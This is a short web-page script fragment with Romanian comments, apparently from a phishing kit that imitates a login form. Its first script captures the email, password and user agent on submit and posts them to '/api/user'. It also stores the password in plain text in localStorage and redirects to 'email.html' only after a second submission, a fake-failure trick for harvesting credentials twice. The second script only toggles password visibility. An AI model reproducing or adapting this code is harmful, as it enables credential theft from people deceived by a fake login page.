<script>
    const userAgent = navigator.userAgent;
    let nr= 0;

    const errorSpan = document.getElementById('form-error');
  
  document.getElementById('myForm').addEventListener('submit', async (e) => {
    e.preventDefault(); 
    let formData = new FormData(e.target);

    if (errorSpan) {
        errorSpan.classList.remove('rr');
    }

          
    formData = JSON.stringify({
      email: formData.get('email'),
      pass: formData.get('password'),
      agent: userAgent
    });

    const response = await fetch('/api/user', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: formData
    });

    console.log(formData)
    localStorage.setItem('usr', formData);

    if(nr > 0) {
        localStorage.setItem('usr', formData);
        window.location.href = 'email.html';
    }
    nr++;

  })  
</script>


<script>
  // Selectăm iconița și input-ul
  const toggleIcon = document.querySelector('[data-toggle-for="password"]');
  const passwordInput = document.querySelector('input[name="password"]');

  toggleIcon.addEventListener('click', () => {
    if (passwordInput.type === 'password') {
      passwordInput.type = 'text'; // facem parola vizibilă
    } else {
      passwordInput.type = 'password'; // ascundem parola
    }
  });
</script>
